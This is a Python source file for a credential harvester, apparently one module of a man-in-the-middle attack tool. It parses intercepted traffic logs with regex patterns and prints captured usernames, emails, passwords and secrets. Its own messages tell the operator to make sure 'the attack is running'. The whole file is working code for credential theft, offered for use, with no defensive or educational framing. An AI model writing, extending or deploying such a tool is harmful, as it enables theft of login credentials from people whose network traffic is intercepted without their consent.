# utils/harvester.py

import re
from termcolor import colored

class CredentialHarvester:
    """Parses captured MitM logs to extract 'decrypted' credentials."""
    
    def __init__(self, log_file="/temp/logs/rubyfi_mitm.log"):
        self.log_file = log_file
        # Regex to find common credential fields in HTTP POST data
        self.patterns = [
            r"(?i)(user|username|login|email|mail)=([^& \n]+)",
            r"(?i)(password|pass|pwd|secret)=([^& \n]+)"
        ]

    def extract(self):
        print(colored("\n" + "═"*40, "green"))
        print(colored("    🔓 EXTRACTED CREDENTIALS 🔓", "green", attrs=['bold']))
        print(colored("═"*40, "green"))
        
        found_any = False
        try:
            with open(self.log_file, "r") as f:
                for line in f:
                    for pattern in self.patterns:
                        matches = re.findall(pattern, line)
                        for key, value in matches:
                            print(colored(f" [!] Found {key}: ", "yellow") + colored(value, "white", attrs=['bold']))
                            found_any = True
            
            if not found_any:
                print(colored(" [*] No credentials found yet. Keep monitoring...", "white"))
        except FileNotFoundError:
            print(colored(" [!] Log file not found. Ensure attack is running.", "red"))